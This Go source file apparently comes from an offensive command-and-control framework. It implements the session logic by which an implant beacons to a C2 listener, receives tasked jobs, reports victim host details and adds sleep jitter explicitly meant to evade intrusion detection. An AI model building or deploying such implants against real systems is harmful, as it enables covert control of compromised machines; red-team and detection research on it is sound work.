package c2

import (
	"context"
	"io"
	"net"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/PurpleSec/escape"
	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const maxErrors = 3

// ErrFullBuffer is returned from the WritePacket function when the send buffer for Session is full.
var ErrFullBuffer = xerr.New("cannot add a Packet to a full send buffer")

// Session is a struct that represents a connection between the client and the Listener. This struct does some
// automatic handeling and acts as the communication channel between the client and server.
type Session struct {
	Last, Created time.Time
	connection

	Mux             Mux
	wake            chan waker
	frags           map[uint16]*cluster
	parent          *Listener
	send, recv, chn chan *com.Packet

	//socket Connector
	conn linker
	peek *com.Packet

	Shutdown func(*Session)
	Receive  func(*Session, *com.Packet)
	ch       chan waker
	proxy    *Proxy
	tick     *time.Ticker
	jobs     map[uint16]*Job
	host     string

	Device device.Machine
	sleep  time.Duration
	lock   sync.RWMutex
	state  state

	ID             device.ID
	jitter, errors uint8
}

// Wait will block until the current Session is closed and shutdown.
func (s *Session) Wait() {
	<-s.ch
}
func (s *Session) wait() {
	if s.sleep < 1 || s.state.Closing() {
		return
	}
	w := s.sleep
	if s.jitter > 0 && s.jitter < 101 {
		if (s.jitter == 100 || uint8(util.FastRandN(100)) < s.jitter) && w > time.Millisecond {
			d := util.Rand.Int63n(int64(w / time.Millisecond))
			if util.FastRandN(2) == 1 {
				d = d * -1
			}
			if w += (time.Duration(d) * time.Millisecond); w < 0 {
				w = time.Duration(w * -1)
			}
			if w == 0 {
				w = s.sleep
			}
		}
	}
	if s.tick == nil {
		s.tick = time.NewTicker(w)
	} else {
		for len(s.tick.C) > 0 { // Drain the ticker.
			<-s.tick.C
		}
		s.tick.Reset(w)
	}
	if cout.Enabled {
		s.log.Trace("[%s] Sleeping for %s.", s.ID, w)
	}
	select {
	case <-s.wake:
		break
	case <-s.tick.C:
		break
	case <-s.ctx.Done():
		s.state.Set(stateClosing)
		break
	}
}

// Wake will interrupt the sleep of the current Session thread. This will trigger the send and receive
// functions of this Session. This is not valid for Server side Sessions.
func (s *Session) Wake() {
	if s.wake == nil || s.parent != nil || s.state.WakeClosed() {
		return
	}
	select {
	case s.wake <- wake:
	default:
	}
}

// Remove will instruct the parent Listener remove itself. This has no effect if the Session
// is a client Session.
func (s *Session) Remove() {
	if s.parent == nil {
		return
	}
	s.parent.Remove(s.ID)
}
func (s *Session) listen() {
	if s.parent != nil {
		return // NOTE: Server side sessions shouldn't be running this.
	}
	for s.wait(); ; s.wait() {
		if cout.Enabled {
			s.log.Debug("[%s] Waking up...", s.ID)
		}
		if s.state.Closing() {
			if cout.Enabled {
				s.log.Info("[%s] Shutdown indicated, queuing final Shutdown Packet.", s.ID)
			}
			s.peek = &com.Packet{ID: SvShutdown, Device: s.ID}
			s.state.Set(stateShutdown)
			s.state.Unset(stateChannelValue)
			s.state.Unset(stateChannelUpdated)
			s.state.Unset(stateChannel)
		}
		// HERE
		//c, err := s.socket.Connect(s.host)
		c, err := s.conn.connect(s)
		if err != nil {
			if s.state.Closing() {
				break
			}
			if cout.Enabled {
				s.log.Warning("[%s] Error attempting to connect to %q: %s!", s.ID, s.host, err)
			}
			if s.errors <= maxErrors {
				s.errors++
				continue
			}
			if cout.Enabled {
				s.log.Error("[%s] Too many errors, closing Session!", s.ID)
			}
			break
		}
		if cout.Enabled {
			s.log.Debug("[%s] Connected to %q...", s.ID, s.host)
		}
		if s.session(c) {
			s.errors = 0
		} else {
			s.errors++
		}
		if c.Close(); s.errors > maxErrors {
			if cout.Enabled {
				s.log.Error("[%s] Too many errors, closing Session!", s.ID)
			}
			break
		}
		if s.state.Shutdown() {
			break
		}
	}
	if cout.Enabled {
		s.log.Trace("[%s] Stopping transaction thread...", s.ID)
	}
	s.shutdown()
}
func (s *Session) shutdown() {
	if s.Shutdown != nil {
		s.s.events <- event{s: s, sf: s.Shutdown}
	}
	if s.proxy != nil {
		s.proxy.Close()
	}
	if !s.state.SendClosed() {
		s.state.Set(stateSendClose)
		close(s.send)
	}
	if s.wake != nil && !s.state.WakeClosed() {
		s.state.Set(stateWakeClose)
		close(s.wake)
	}
	if s.recv != nil && !s.state.CanRecv() && !s.state.RecvClosed() {
		s.state.Set(stateRecvClose)
		close(s.recv)
	}
	if s.tick != nil {
		s.tick.Stop()
	}
	if s.state.Set(stateClosed); s.parent != nil && !s.parent.state.WakeClosed() {
		s.parent.close <- s.ID.Hash()
	}
	close(s.ch)
}
func (s *Session) chanWake() {
	if s.state.WakeClosed() || len(s.wake) >= cap(s.wake) {
		return
	}
	select {
	case s.wake <- wake:
	default:
	}
}
func (s *Session) name() string {
	return s.ID.String()
}

// Jobs returns all current Jobs for this Session. This returns nil if there are no Jobs or
// this Session does not have the ability to schedule them.
func (s *Session) Jobs() []*Job {
	if s.jobs == nil || len(s.jobs) == 0 {
		return nil
	}
	r := make([]*Job, 0, len(s.jobs))
	for _, j := range s.jobs {
		r = append(r, j)
	}
	return r
}

// Close stops the listening thread from this Session and releases all associated resources. This
// function blocks until the running threads close completely.
func (s *Session) Close() error {
	if s.state.Closing() {
		return nil
	}
	s.state.Unset(stateChannelValue)
	s.state.Unset(stateChannelUpdated)
	s.state.Unset(stateChannel)
	if s.state.Set(stateClosing); s.parent != nil {
		s.shutdown()
		return nil
	}
	s.Wake()
	<-s.ch
	return nil
}

// Jitter returns the Jitter percentage value. Values of zero (0) indicate that Jitter is disabled.
func (s *Session) Jitter() uint8 {
	return s.jitter
}

// IsProxy returns true when a Proxy has been attached to this Session and is active.
func (s *Session) IsProxy() bool {
	return s.proxy != nil
}

// IsActive returns true if this Session is still able to send and receive Packets.
func (s *Session) IsActive() bool {
	return !s.state.Closing()
}
func (s *Session) chanWakeClear() {
	if s.state.WakeClosed() {
		return
	}
	for len(s.wake) > 0 {
		<-s.wake // Drain waker
	}
}

// IsClient returns true when this Session is not associated to a Listener on this end, which signifies that this
// session is Client initiated.
func (s *Session) IsClient() bool {
	return s.parent == nil
}
func (s *Session) chanStop() bool {
	return s.state.ChannelCanStop()
}

// InChannel will return true is this Session sets the Channel flag on any Packets that flow through this
// Session, including Proxied clients or if this Session is currently in Channel mode, even if not explicitly set.
func (s *Session) InChannel() bool {
	return s.state.Channel() || s.state.ChannelValue()
}
func (s *Session) accept(i uint16) {
	if i < 2 || s.parent == nil || s.jobs == nil || len(s.jobs) == 0 {
		return
	}
	s.lock.RLock()
	j, ok := s.jobs[i]
	if s.lock.RUnlock(); !ok {
		return
	}
	if j.Status = StatusAccepted; j.Update != nil {
		s.s.events <- event{j: j, jf: j.Update}
	}
	if cout.Enabled {
		s.log.Trace("[%s] Set JobID %d to accepted.", s.ID, i)
	}
}
func (s *Session) update(a string) {
	s.Last, s.host = time.Now(), a
}
func (s *Session) chanStart() bool {
	return s.state.ChannelCanStart()
}
func (s *Session) newJobID() uint16 {
	var (
		ok   bool
		i, c uint16
	)
	s.lock.RLock()
	for ; c < 512; c++ {
		i = uint16(util.FastRand())
		if _, ok = s.jobs[i]; !ok && i > 1 {
			s.lock.RUnlock()
			return i
		}
	}
	s.lock.RUnlock()
	return 0
}

// Read attempts to grab a Packet from the receiving buffer. This function returns nil if the buffer is empty.
func (s *Session) Read() *com.Packet {
	if s.recv == nil || !s.state.CanRecv() {
		return nil
	}
	if len(s.recv) > 0 {
		return <-s.recv
	}
	return nil
}
func (s *Session) stateSet(v uint32) {
	s.state.Set(v)
}
func (s *Session) chanRunning() bool {
	return s.state.Channel()
}

// SetChannel will disable setting the Channel mode of this Session. If true, every Packet sent will trigger Channel
// mode. This setting does NOT affect the Session enabling Channel mode if a Packet is sent with the Channel Flag
// enabled. Channel is NOT supported by non-statefull connections (UDP/ICMP, etc). Changes to this setting will call
// the 'Wake' function.
func (s *Session) SetChannel(c bool) {
	if s.state.Closing() || !s.state.SetChannel(c) {
		return
	}
	if c {
		s.queue(&com.Packet{Flags: com.FlagChannel, Device: s.ID})
	} else {
		s.queue(&com.Packet{Flags: com.FlagChannelEnd, Device: s.ID})
	}
	if !s.state.Channel() && s.parent == nil && s.wake != nil && len(s.wake) < cap(s.wake) {
		s.wake <- wake
	}
}

// Job returns a Job with the associated ID, if it exists. It returns nil otherwise.
func (s *Session) Job(i uint16) *Job {
	if i < 2 || s.jobs == nil || len(s.jobs) == 0 {
		return nil
	}
	s.lock.RLock()
	j := s.jobs[i]
	s.lock.RUnlock()
	return j
}

// RemoteAddr returns a string representation of the remotely connected IP address. This could be the IP address of the
// c2 server or the public IP of the client.
func (s *Session) RemoteAddr() string {
	// HERE
	return s.host
}

// Send adds the supplied Packet into the stack to be sent to the server on next wake. This call is asynchronous
// and returns immediately. Unlike 'Write' this function does NOT return an error and will wait if the send buffer is full.
func (s *Session) Send(p *com.Packet) {
	s.write(true, p)
}
func (s *Session) queue(n *com.Packet) {
	if s.state.SendClosed() {
		return
	}
	if n.Device.Empty() {
		panic("found empty ID" + n.String())
		//n.Device = s.ID
	}
	if cout.Enabled {
		s.log.Trace("[%s] Adding Packet %q to queue.", s.ID, n)
	}
	if s.chn != nil {
		select {
		case s.chn <- n:
		default:
			if cout.Enabled {
				s.log.Warning("[%s] Packet %q was dropped during a call to queue! (Maybe increase the chan size?)", s.ID, n)
			}
		}
		return
	}
	select {
	case s.send <- n:
	default:
		if cout.Enabled {
			s.log.Warning("[%s] Packet %q was dropped during a call to queue! (Maybe increase the chan size?)", s.ID, n)
		}
	}
}
func (s *Session) stateUnset(v uint32) {
	s.state.Unset(v)
}

// Time returns the value for the timeout period between C2 Server connections.
func (s *Session) Time() time.Duration {
	return s.sleep
}

// Listener will return the Listener that created the Session. This will return nil if
// the session is not on the server side.
func (s *Session) Listener() *Listener {
	return s.parent
}
func (s *Session) clientID() device.ID {
	return s.ID
}

// JSON returns the data of this Session as a JSON blob.
func (s *Session) JSON(w io.Writer) error {
	if !cout.Enabled {
		return nil
	}
	if _, err := w.Write([]byte(`{` +
		`"id":"` + s.ID.String() + `",` +
		`"hash":"` + strconv.Itoa(int(s.ID.Hash())) + `",` +
		`"channel":` + strconv.FormatBool(s.InChannel()) + `,` +
		`"device":{` +
		`"id":"` + s.ID.Full() + `",` +
		`"user":` + escape.JSON(s.Device.User) + `,` +
		`"hostname":` + escape.JSON(s.Device.Hostname) + `,` +
		`"version":` + escape.JSON(s.Device.Version) + `,` +
		`"arch":"` + s.Device.Arch.String() + `",` +
		`"os":` + escape.JSON(s.Device.OS.String()) + `,` +
		`"elevated":` + strconv.FormatBool(s.Device.Elevated) + `,` +
		`"pid":` + strconv.Itoa(int(s.Device.PID)) + `,` +
		`"ppid":` + strconv.Itoa(int(s.Device.PPID)) + `,` +
		`"network":[`,
	)); err != nil {
		return err
	}
	for i := range s.Device.Network {
		if i > 0 {
			if _, err := w.Write([]byte{0x2C}); err != nil {
				return err
			}
		}
		if _, err := w.Write([]byte(
			`{"name":` + escape.JSON(s.Device.Network[i].Name) + `,` +
				`"mac":"` + s.Device.Network[i].Mac.String() + `","ip":[`,
		)); err != nil {
			return err
		}
		for x := range s.Device.Network[i].Address {
			if x > 0 {
				if _, err := w.Write([]byte{0x2C}); err != nil {
					return err
				}
			}
			if _, err := w.Write([]byte(`"` + s.Device.Network[i].Address[x].String() + `"`)); err != nil {
				return err
			}
		}
		if _, err := w.Write([]byte("]}")); err != nil {
			return err
		}
	}
	_, err := w.Write([]byte(
		`]},"created":"` + s.Created.Format(time.RFC3339) + `",` +
			`"last":"` + s.Last.Format(time.RFC3339) + `",` +
			`"via":` + escape.JSON(s.host) + `,` +
			`"sleep":` + strconv.Itoa(int(s.sleep)) + `,` +
			`"jitter":` + strconv.Itoa(int(s.jitter)),
	))
	if err != nil {
		return err
	}
	if t, ok := s.parent.listener.(stringer); ok {
		if _, err = w.Write([]byte(`,"connector":` + escape.JSON(t.String()))); err != nil {
			return err
		}
	}
	_, err = w.Write([]byte{0x7D})
	return err
}
func (s *Session) session(c net.Conn) bool {
	n := s.next(false)
	if s.state.Unset(stateChannel); s.state.ChannelCanStart() {
		if n.Flags |= com.FlagChannel; cout.Enabled {
			s.log.Trace("[%s] %s: Setting Channel flag on next Packet!", s.ID, s.host)
		}
		s.state.Set(stateChannel)
	} else if n.Flags&com.FlagChannel != 0 {
		if cout.Enabled {
			s.log.Trace("[%s] %s: Channel was set by next incoming Packet!", s.ID, s.host)
		}
		s.state.Set(stateChannel)
	}
	if cout.Enabled {
		s.log.Debug("[%s] %s: Sending Packet %q.", s.ID, s.host, n)
	}
	// HERE
	err := writePacket(c, s.w, s.t, n)
	if n.Clear(); err != nil {
		if cout.Enabled {
			s.log.Warning("[%s] %s: Error attempting to write Packet: %s!", s.ID, s.host, err)
		}
		return false
	}
	if n.Flags&com.FlagChannel != 0 && !s.state.Channel() {
		s.state.Set(stateChannel)
	}
	n = nil
	// HERE
	if n, err = readPacket(c, s.w, s.t); err != nil {
		if cout.Enabled {
			s.log.Warning("[%s] %s: Error attempting to read Packet: %s!", s.ID, s.host, err)
		}
		return false
	}
	if n.Flags&com.FlagChannel != 0 && !s.state.Channel() {
		if s.state.Set(stateChannel); cout.Enabled {
			s.log.Trace("[%s] %s: Enabling Channel as received Packet has a Channel flag!", s.ID, s.host)
		}
	}
	if cout.Enabled {
		s.log.Debug("[%s] %s: Received a Packet %q..", s.ID, s.host, n)
	}
	if err = receive(s, s.parent, n); err != nil {
		if cout.Enabled {
			s.log.Warning("[%s] %s: Error processing packet data: %s!", s.ID, s.host, err)
		}
		return false
	}
	if !s.state.Channel() {
		return true
	}
	go s.channelRead(c)
	s.channelWrite(c)
	c.SetDeadline(time.Now().Add(-time.Second))
	s.state.Unset(stateChannel)
	return true
}
func (s *Session) frag(i, max, cur uint16) {
	if i < 2 || s.parent == nil || s.jobs == nil || len(s.jobs) == 0 {
		return
	}
	s.lock.RLock()
	j, ok := s.jobs[i]
	if s.lock.RUnlock(); !ok {
		return
	}
	if j.Frags == 0 {
		j.Status = StatusReceiving
	}
	if j.Frags, j.Current = max, cur; j.Update != nil {
		s.s.events <- event{j: j, jf: j.Update}
	}
	if cout.Enabled {
		s.log.Trace("[%s/Frag] Tracking Frag Group %X, Current %d of %d.", s.ID, i, cur, max)
	}
}
func (s *Session) pick(i bool) *com.Packet {
	if s.peek != nil {
		n := s.peek
		s.peek = nil
		return n
	}
	if len(s.send) > 0 {
		return <-s.send
	}
	switch {
	case s.parent != nil && s.state.Channel():
		select {
		case <-s.wake:
			return nil
		case n := <-s.send:
			return n
		}
	case !i && s.parent == nil && s.state.Channel():
		var o uint32
		go func() {
			if s.wait(); atomic.LoadUint32(&o) == 0 {
				s.send <- &com.Packet{Device: s.ID}
			}
		}()
		n := <-s.send
		atomic.StoreUint32(&o, 1)
		return n
	case i:
		return nil
	}
	return &com.Packet{Device: s.ID}
}
func (s *Session) next(i bool) *com.Packet {
	n := s.pick(i)
	if n == nil {
		return nil
	}
	if s.proxy != nil {
		n.Tags = s.proxy.tags()
	}
	if len(s.send) == 0 && n.Verify(s.ID) {
		s.accept(n.Job)
		s.state.SetLast(0)
		return n
	}
	t := n.Tags
	if l := s.state.Last(); l > 0 {
		for n.Flags.Group() == l && len(s.send) > 0 {
			n = <-s.send
		}
		if s.state.SetLast(0); n == nil || n.Flags.Group() == l {
			return &com.Packet{Device: s.ID, Tags: t}
		}
	}
	n, s.peek = nextPacket(s, s.send, n, s.ID, t)
	n.Tags = mergeTags(n.Tags, t)
	return n
}
func (s *Session) deadlineRead() time.Time {
	if s.sleep > 0 {
		return time.Now().Add(s.sleep * sleepMod)
	}
	return empty
}
func (s *Session) deadlineWrite() time.Time {
	return empty
}
func (s *Session) sender() chan *com.Packet {
	return s.send
}

// Write adds the supplied Packet into the stack to be sent to the server on next wake. This call is
// asynchronous and returns immediately. 'ErrFullBuffer' will be returned if the send buffer is full.
func (s *Session) Write(p *com.Packet) error {
	return s.write(false, p)
}
func (s *Session) handle(p *com.Packet) bool {
	if p == nil || p.Device.Empty() || p.ID != RvResult || p.Job < 2 {
		return false
	}
	if s.jobs == nil || len(s.jobs) == 0 {
		if cout.Enabled {
			s.log.Warning("[%s/ShC] Received an un-tracked Job ID %d!", s.ID, p.Job)
		}
		return false
	}
	s.lock.RLock()
	j, ok := s.jobs[p.Job]
	if s.lock.RUnlock(); !ok {
		if cout.Enabled {
			s.log.Warning("[%s:/ShC] Received an un-tracked Job ID %d!", s.ID, p.Job)
		}
		return false
	}
	if cout.Enabled {
		s.log.Info("[%s/ShC] Received response for Job ID %d.", s.ID, j.ID)
	}
	if j.Result, j.Complete, j.Status = p, time.Now(), StatusCompleted; p.Flags&com.FlagError != 0 {
		j.Status = StatusError
		if err := p.ReadString(&j.Error); err != nil {
			j.Error = err.Error()
		}
	}
	s.lock.Lock()
	delete(s.jobs, j.ID)
	s.lock.Unlock()
	if j.cancel(); j.Update != nil {
		s.s.events <- event{j: j, jf: j.Update}
	}
	return true
}

// Packets will create and setup the Packet receiver channel. This function will then return
// the read-only Packet channel for use.
//
// This function is safe to use multiple times as it will return the same chan if it already exists.
func (s *Session) Packets() <-chan *com.Packet {
	if s.recv != nil && s.state.CanRecv() {
		return s.recv
	}
	s.recv = make(chan *com.Packet, 256)
	if s.state.Set(stateCanRecv); cout.Enabled {
		s.log.Info("[%s] Enabling Packet receive channel.", s.ID)
	}
	return s.recv
}

// MarshalJSON fulfils the JSON Marshaler interface.
func (s *Session) MarshalJSON() ([]byte, error) {
	if !cout.Enabled {
		return nil, nil
	}
	b := buffers.Get().(*data.Chunk)
	s.JSON(b)
	d := b.Payload()
	returnBuffer(b)
	return d, nil
}

// SetJitter sets Jitter percentage of the Session's wake interval. This is a 0 to 100 percentage (inclusive) that
// will determine any +/- time is added to the waiting period. This assists in evading IDS/NDS devices/systems. A
// value of 0 will disable Jitter and any value over 100 will set the value to 100, which represents using Jitter 100%
// of the time. If this is a Server-side Session, the new value will be sent to the Client in a MvTime Packet.
func (s *Session) SetJitter(j int) (*Job, error) {
	return s.SetDuration(s.sleep, j)
}

// Task is a function that will attach a JobID to the specified Packet (if empty) and wil return a Job promise
// that can be used to internally keep track of a response Packet with a matching Job ID.
//
// Errors will be returned if Task is attempted on an invalid Packet or client-side session.
// Errors will also be returned if the Job ID is already in use or the scheduler is full.
func (s *Session) Task(n *com.Packet) (*Job, error) {
	if n == nil {
		return nil, ErrMalformedPacket
	}
	if s.parent == nil || s.jobs == nil {
		return nil, xerr.Wrap("cannot be a client session", ErrUnable)
	}
	if n.Job == 0 {
		if n.Job = s.newJobID(); n.Job == 0 {
			return nil, xerr.New("unable to find an unused Job ID")
		}
	}
	if n.Device.Empty() {
		n.Device = s.Device.ID
	}
	s.lock.RLock()
	_, ok := s.jobs[n.Job]
	if s.lock.RUnlock(); ok {
		return nil, xerr.New("Job ID " + strconv.Itoa(int(n.Job)) + " is already being tracked")
	}
	if err := s.write(false, n); err != nil {
		return nil, err
	}
	j := &Job{ID: n.Job, Type: n.ID, Start: time.Now(), Session: s}
	j.ctx, j.cancel = context.WithCancel(s.ctx)
	s.lock.Lock()
	s.jobs[n.Job] = j
	if s.lock.Unlock(); cout.Enabled {
		s.log.Info("[%s/ShC] Added JobID %d to Track!", s.ID, n.Job)
	}
	return j, nil
}
func (s *Session) write(w bool, n *com.Packet) error {
	if s.state.Closing() || s.state.SendClosed() {
		return io.ErrClosedPipe
	}
	if n.Size() <= limits.Frag || limits.Frag == 0 {
		if !w {
			switch {
			case s.chn != nil && len(s.chn)+1 >= cap(s.chn):
				fallthrough
			case len(s.send)+1 >= cap(s.send):
				return ErrFullBuffer
			}
		}
		if s.queue(n); s.state.Channel() {
			s.Wake()
		}
		return nil
	}
	m := (n.Size() / limits.Frag) + 1
	if !w && len(s.send)+m >= cap(s.send) {
		return ErrFullBuffer
	}
	var (
		x    = int64(n.Size())
		g    = uint16(util.FastRand())
		err  error
		t, v int64
	)
	for i := 0; i <= m && t < x; i++ {
		c := &com.Packet{ID: n.ID, Job: n.Job, Flags: n.Flags, Chunk: data.Chunk{Limit: limits.Frag}}
		c.Flags.SetGroup(g)
		c.Flags.SetLen(uint16(m))
		c.Flags.SetPosition(uint16(i))
		if v, err = n.WriteTo(c); err != nil && err != data.ErrLimit {
			c.Flags.SetLen(0)
			c.Flags.SetPosition(0)
			c.Flags.Set(com.FlagError)
			c.Reset()
		}
		t += v
		if s.queue(c); s.state.Channel() {
			s.Wake()
		}
	}
	n.Clear()
	return err
}

// SetSleep sets the wake interval period for this Session. This is the time value between connections to the C2
// Server. This does NOT apply to channels. If this is a Server-side Session, the new value will be sent to the
// Client in a MvTime Packet. This setting does not affect Jitter.
func (s *Session) SetSleep(t time.Duration) (*Job, error) {
	return s.SetDuration(t, int(s.jitter))
}

// SetDuration sets the wake interval period and Jitter for this Session. This is the time value between
// connections to the C2 Server. This does NOT apply to channels. Jitter is a 0 to 100 percentage (inclusive) that
// will determine any +/- time is added to the waiting period. This assists in evading IDS/NDS devices/systems. A
// value of 0 will disable Jitter and any value over 100 will set the value to 100, which represents using Jitter 100%
// of the time. If this is a Server-side Session, the new value will be sent to the Client in a MvTime Packet.
func (s *Session) SetDuration(t time.Duration, j int) (*Job, error) {
	switch {
	case j < 0:
		s.jitter = 0
	case j > 100:
		s.jitter = 100
	default:
		s.jitter = uint8(j)
	}
	if s.sleep = t; s.parent == nil {
		return nil, nil
	}
	n := &com.Packet{ID: task.MvTime, Device: s.Device.ID}
	n.WriteUint8(s.jitter)
	n.WriteUint64(uint64(s.sleep))
	return s.Task(n)
}
